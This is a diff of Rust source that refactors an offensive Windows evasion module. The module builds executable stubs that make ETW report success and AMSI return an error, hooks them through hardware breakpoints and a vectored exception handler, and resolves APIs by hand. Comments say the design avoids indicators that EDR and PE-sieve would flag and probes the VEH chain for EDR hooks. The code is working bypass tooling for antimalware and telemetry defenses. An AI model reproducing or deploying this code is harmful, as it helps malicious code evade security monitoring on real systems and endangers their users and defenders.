@@ -231,6 +231,15 @@ pub(crate) unsafe fn diag(ch: u8) {
     if !DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
         return;
     }
+    let path = diag_build_path();
+    let Some((cf, wf, ch_)) = diag_resolve_io_fns() else {
+        return;
+    };
+    diag_append_byte(path.as_ptr(), ch, cf, wf, ch_);
+}
+
+/// Build the UTF-16 (null-terminated) path buffer for C:\nyx\hwbp_diag.txt.
+fn diag_build_path() -> [u16; 22] {
     let mut path = [0u16; 22];
     let name = b"C:\\nyx\\hwbp_diag.txt";
     let mut i = 0;
@@ -239,7 +248,25 @@ pub(crate) unsafe fn diag(ch: u8) {
         i += 1;
     }
     path[name.len()] = 0;
+    path
+}
 
+/// Resolve CreateFileW / WriteFile / CloseHandle (kernelbase, falling back
+/// to kernel32). Returns None if any export is missing.
+unsafe fn diag_resolve_io_fns() -> Option<(usize, usize, usize)> {
+    let cf = crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
+        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))?;
+    let wf = crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
+        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"WriteFile"))?;
+    let ch_ = crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
+        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))?;
+    Some((cf, wf, ch_))
+}
+
+/// Append one ASCII marker byte to the diag file: open in append mode, seek
+/// to the end, write, and close. Exported addresses are raw; the fn-pointer
+/// types are defined here.
+unsafe fn diag_append_byte(path: *const u16, ch: u8, cf: usize, wf: usize, ch_: usize) {
     type FnCreate = unsafe extern "system" fn(
         *const u16,
         u32,
@@ -259,27 +286,12 @@ pub(crate) unsafe fn diag(ch: u8) {
     type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
     type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;
 
-    let Some(cf) = crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
-        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))
-    else {
-        return;
-    };
-    let Some(wf) = crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
-        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"WriteFile"))
-    else {
-        return;
-    };
-    let Some(ch_) = crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
-        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))
-    else {
-        return;
-    };
     let create_file: FnCreate = core::mem::transmute(cf);
     let write_file: FnWrite = core::mem::transmute(wf);
     let close_handle: FnClose = core::mem::transmute(ch_);
 
     let h = create_file(
-        path.as_ptr(),
+        path,
         4,
         3,
         core::ptr::null_mut(),
@@ -313,11 +325,25 @@ pub unsafe fn init_shadow_buffer() -> bool {
     {
         return true;
     }
+    let Some(page) = alloc_shadow_page() else {
+        return false;
+    };
+    write_shadow_stubs(page);
+    downgrade_shadow_page(page);
+    // Publish the shadow buffer base with Release so any reader that observes
+    // a non-null value also observes the fully-written, RX-downgraded stubs.
+    SHADOW_BUF.store(page, core::sync::atomic::Ordering::Release);
+    true
+}
+
+/// Resolve VirtualAlloc and allocate a single 0x1000-byte page as
+/// PAGE_READWRITE for the shadow stubs. Returns null if unavailable.
+unsafe fn alloc_shadow_page() -> Option<*mut u8> {
     let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
     {
         Some(a) => a,
-        None => return false,
+        None => return None,
     };
     type VAlloc = unsafe extern "system" fn(
         *mut core::ffi::c_void,
@@ -330,9 +356,15 @@ pub unsafe fn init_shadow_buffer() -> bool {
     // Allocate as RW first, write shadow stubs, then downgrade to RX.
     let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x04);
     if page.is_null() {
-        return false;
+        return None;
     }
-    let page_u8 = page as *mut u8;
+    Some(page as *mut u8)
+}
+
+/// Write the two shadow stubs into the first 64 bytes of the page.
+/// Stub 0 at offset 0: xor eax,eax; ret  (ETW → return 0 = success)
+/// Stub 1 at offset 8: mov eax,0x80070057; ret  (AMSI → return E_INVALIDARG)
+unsafe fn write_shadow_stubs(page_u8: *mut u8) {
     // SAFETY: page is a freshly-allocated 0x1000-byte RW page we own; we only
     // touch the first 64 bytes where the two stubs live.
     let buf = core::slice::from_raw_parts_mut(page_u8, 64);
@@ -347,10 +379,13 @@ pub unsafe fn init_shadow_buffer() -> bool {
     buf[11] = 0x07;
     buf[12] = 0x80;
     buf[13] = 0xC3;
+}
 
-    // Downgrade page protection: PAGE_READWRITE → PAGE_EXECUTE_READ (0x20).
-    // Shadow stubs are written once and never modified; RX is sufficient and
-    // closes the RWX IOC that EDR/PE-sieve would flag.
+/// Downgrade the shadow page from PAGE_READWRITE to PAGE_EXECUTE_READ (0x20).
+/// Best-effort: a failed VirtualProtect resolution is ignored. Shadow stubs
+/// are written once and never modified; RX is sufficient and closes the RWX
+/// IOC that EDR/PE-sieve would flag.
+unsafe fn downgrade_shadow_page(page: *mut u8) {
     type FnVP = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
     let vp_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
@@ -358,13 +393,8 @@ pub unsafe fn init_shadow_buffer() -> bool {
         let vp_fn: FnVP = core::mem::transmute(vp);
         let mut old_protect: u32 = 0;
         // PAGE_EXECUTE_READ = 0x20
-        let _ = vp_fn(page, 0x1000, 0x20, &mut old_protect);
+        let _ = vp_fn(page as *mut core::ffi::c_void, 0x1000, 0x20, &mut old_protect);
     }
-
-    // Publish the shadow buffer base with Release so any reader that observes
-    // a non-null value also observes the fully-written, RX-downgraded stubs.
-    SHADOW_BUF.store(page_u8, core::sync::atomic::Ordering::Release);
-    true
 }
 
 unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
@@ -635,54 +665,81 @@ unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
 /// On failure, also sets `VEH_SAFE` to `false`.
 pub(crate) fn veh_chain_has_handlers() -> bool {
     unsafe {
-        // Resolve AddVectoredExceptionHandler
-        let add_addr =
-            match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
-                .or_else(|| {
-                    crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
-                }) {
-                Some(a) => a,
-                None => {
-                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
-                    return true;
-                }
-            };
-        type AddVEH = unsafe extern "system" fn(
-            usize,
-            unsafe extern "system" fn(usize) -> i32,
-        ) -> *mut core::ffi::c_void;
-        let add: AddVEH = core::mem::transmute(add_addr);
-
-        // Resolve RemoveVectoredExceptionHandler
-        let rm_addr =
-            match crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
-                .or_else(|| {
-                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
-                }) {
-                Some(a) => a,
-                None => {
-                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
-                    return true;
-                }
-            };
-        type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-        let rm: RemoveVEH = core::mem::transmute(rm_addr);
-
-        // Register probe at the front of the chain (First = 1).
-        let handle = add(1, probe_veh_handler);
-        if handle.is_null() {
-            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+        let Some(add) = resolve_add_veh() else {
             return true;
-        }
-
-        // Remove the probe immediately.
-        if rm(handle) == 0 {
-            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+        };
+        let Some(rm) = resolve_remove_veh() else {
             return true;
-        }
-
-        false // chain appears clean
+        };
+        probe_veh_chain(add, rm)
     }
+}
+
+/// Resolve AddVectoredExceptionHandler. On failure, marks the chain unsafe
+/// (`VEH_SAFE = false`) and returns None — the caller reports the chain as
+/// compromised.
+unsafe fn resolve_add_veh() -> Option<
+    unsafe extern "system" fn(
+        usize,
+        unsafe extern "system" fn(usize) -> i32,
+    ) -> *mut core::ffi::c_void,
+> {
+    let add_addr =
+        match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
+            .or_else(|| {
+                crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
+            }) {
+            Some(a) => a,
+            None => {
+                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                return None;
+            }
+        };
+    Some(core::mem::transmute(add_addr))
+}
+
+/// Resolve RemoveVectoredExceptionHandler. On failure, marks the chain unsafe
+/// (`VEH_SAFE = false`) and returns None — the caller reports the chain as
+/// compromised.
+unsafe fn resolve_remove_veh() -> Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32> {
+    let rm_addr =
+        match crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
+            .or_else(|| {
+                crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+            }) {
+            Some(a) => a,
+            None => {
+                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                return None;
+            }
+        };
+    Some(core::mem::transmute(rm_addr))
+}
+
+/// Register the transient probe handler at the front of the chain and remove
+/// it immediately. Returns true if the chain appears compromised (either
+/// call failed, e.g. an EDR hooking the VEH API or already occupying it).
+unsafe fn probe_veh_chain(
+    add: unsafe extern "system" fn(
+        usize,
+        unsafe extern "system" fn(usize) -> i32,
+    ) -> *mut core::ffi::c_void,
+    rm: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
+) -> bool {
+    // Register probe at the front of the chain (First = 1).
+    let handle = add(1, probe_veh_handler);
+    if handle.is_null() {
+        VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+        return true;
+    }
+
+    // Remove the probe immediately.
+    if rm(handle) == 0 {
+        VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+        return true;
+    }
+
+    false // chain appears clean
 }
 // ---- ADD / REMOVE --------------------------------------------------------
 
@@ -901,48 +958,92 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     diag(b'a');
 
     // 0. Preconditions.
-    if SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire).is_null() {
-        diag(b'1');
-        return Err("shadow buffer not initialized");
-    }
-    let shadow = match shadow_addr(shadow_type) {
-        Some(s) => s,
-        None => { diag(b'2'); return Err("invalid shadow type"); }
+    let shadow = match resolve_shadow_for_arm(shadow_type) {
+        Ok(s) => s,
+        Err(e) => return Err(e),
     };
     diag(b'b');
 
     // 1. Claim a free HWBP slot.
-    let slot = match claim_slot() {
+    let slot = match claim_hwbp_slot() {
         Ok(s) => s,
-        Err(e) => { diag(b'3'); return Err(e); }
+        Err(e) => return Err(e),
     };
     diag(b'c');
-
-    // Release slot on any early-exit below.
-    let release = |s: usize, tag: u8, err: &'static str| -> Result<usize, &'static str> {
-        HWBP_SLOT_STATE[s].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
-        diag(tag);
-        Err(err)
-    };
 
     // 2. Resolve NT context functions.
     let (ntgct, ntsct) = match resolve_nt_context_fns() {
         Ok(f) => f,
         Err(e) => {
             let tag = if e.contains("Get") { b'H' } else { b'J' };
-            return release(slot, tag, e);
+            return release_slot(slot, tag, e);
         }
     };
 
     // 3. Register VEH once (must be before breakpoints).
     if let Err(e) = register_veh_once(slot) {
-        return release(slot, b'D', e);
+        return release_slot(slot, b'D', e);
     }
 
+    // 4–6. Allocate the CONTEXT buffer, configure the DR register, and
+    // publish the armed entry.
+    match arm_and_publish_slot(slot, target_addr, shadow, ntgct, ntsct) {
+        Ok(()) => {
+            diag(b'k');
+            Ok(slot)
+        }
+        Err((tag, e)) => release_slot(slot, tag, e),
+    }
+}
+
+/// Resolve the shadow stub address for arming, tagging the diag stream
+/// (b'1' = shadow buffer not initialized, b'2' = invalid shadow type).
+unsafe fn resolve_shadow_for_arm(shadow_type: ShadowType) -> Result<usize, &'static str> {
+    if SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire).is_null() {
+        diag(b'1');
+        return Err("shadow buffer not initialized");
+    }
+    match shadow_addr(shadow_type) {
+        Some(s) => Ok(s),
+        None => {
+            diag(b'2');
+            Err("invalid shadow type")
+        }
+    }
+}
+
+/// Claim a free HWBP slot, tagging exhaustion with b'3' on the diag stream.
+unsafe fn claim_hwbp_slot() -> Result<usize, &'static str> {
+    match claim_slot() {
+        Ok(s) => Ok(s),
+        Err(e) => {
+            diag(b'3');
+            Err(e)
+        }
+    }
+}
+
+/// Release a claimed slot back to VACANT on an early-exit error path.
+unsafe fn release_slot(slot: usize, tag: u8, err: &'static str) -> Result<usize, &'static str> {
+    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
+    diag(tag);
+    Err(err)
+}
+
+/// Allocate a CONTEXT buffer, configure the DR register for an execute
+/// breakpoint, and publish the armed entry (write pool cell, flip
+/// CLAIMED→OCCUPIED, bump the live count). Returns Err((diag_tag, msg)).
+unsafe fn arm_and_publish_slot(
+    slot: usize,
+    target_addr: usize,
+    shadow: usize,
+    ntgct: unsafe extern "system" fn(usize, usize) -> i32,
+    ntsct: unsafe extern "system" fn(usize, usize) -> i32,
+) -> Result<(), (u8, &'static str)> {
     // 4. Allocate CONTEXT buffer.
     let base = match alloc_ctx_buf() {
         Ok(b) => b,
-        Err(e) => return release(slot, b'F', e),
+        Err(e) => return Err((b'F', e)),
     };
     let ctx_buf = base as *mut core::ffi::c_void;
     diag(b'f');
@@ -950,7 +1051,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     // 5. Configure DR registers for the execute breakpoint.
     let original_dr7 = match configure_dr_slot(base, slot, target_addr, ntgct, ntsct, ctx_buf) {
         Ok(dr7) => dr7,
-        Err(e) => return release(slot, b'K', e),
+        Err(e) => return Err((b'K', e)),
     };
 
     // 6. Publish the armed entry: write pool cell, then flip CLAIMED→OCCUPIED.
@@ -958,8 +1059,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     core::ptr::write(cell_ptr, HwbpEntry { target: target_addr, shadow, original_dr7 });
     HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
     HWBP_COUNT.fetch_add(1, core::sync::atomic::Ordering::Release);
-    diag(b'k');
-    Ok(slot)
+    Ok(())
 }
 
 /// Remove a hardware breakpoint and restore the original DR7.
